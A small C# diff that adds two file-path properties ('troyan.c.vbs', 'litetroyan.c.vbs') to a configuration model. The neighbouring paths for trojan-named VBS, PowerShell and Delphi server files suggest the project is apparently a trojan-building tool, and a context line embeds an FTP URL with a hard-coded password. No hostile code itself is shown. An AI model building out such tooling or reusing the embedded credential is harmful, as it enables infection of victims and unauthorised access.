@@ -173,6 +173,9 @@ namespace model
         [JsonPropertyName("userLiteVbsFile")] public string UserLiteVbsFile => Path.Join(UserDataDir, "litetroyan.vbs");
         [JsonPropertyName("userPowershellFile")] public string UserPowershellFile => Path.Join(UserDataDir, "troyan.txt");
         [JsonPropertyName("userDelphiIco")] public string UserDelphiIco => Path.Join(UserDataDir, "server.ico");
+        
+        [JsonPropertyName("userVbsFileClean")] public string UserVbsFileClean => Path.Join(UserDataDir, "troyan.c.vbs");
+        [JsonPropertyName("userLiteVbsFileClean")] public string UserLiteVbsFileClean => Path.Join(UserDataDir, "litetroyan.c.vbs");
 
         //FTP
         [JsonPropertyName("ftp")] public string Ftp => $@"ftp://ftpData:Abc12345!@{Server}";
